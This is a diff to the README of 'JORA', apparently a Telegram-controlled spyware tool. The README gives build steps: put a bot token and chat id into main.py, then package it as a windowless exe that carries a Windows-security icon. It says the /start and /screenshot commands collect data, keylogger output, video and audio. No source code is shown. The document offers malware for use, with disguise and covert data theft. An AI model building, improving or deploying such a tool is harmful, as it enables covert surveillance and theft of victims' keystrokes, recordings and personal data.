@@ -24,17 +24,17 @@ JORA functionality:
 
 You need to pull the project fromthe repository. 
 
-Fill in the details of your telegram (TOKEN bot and your chat id)
+Fill in the details of your telegram (TOKEN bot and your chat id) in main.py.
 
 Install all libraries from requirements.txt , start the virtual environment and run the command
 
 pyinstaller --onefile -w --icon=img\windows-security-new.png main.py
 
-which is located in the command to create file exe.txt.
+which is located in the "command to create file exe.txt".
 
-The result is an exe file ready to work.
+The result is an exe file ready to work. Which is located in the "dist" directory
 
-When you enter / start vs collect the data you need
+When you enter / start collect the data you need
 
 When entering /screenshot we take the result of the keylogger, recording video and audio
 ---
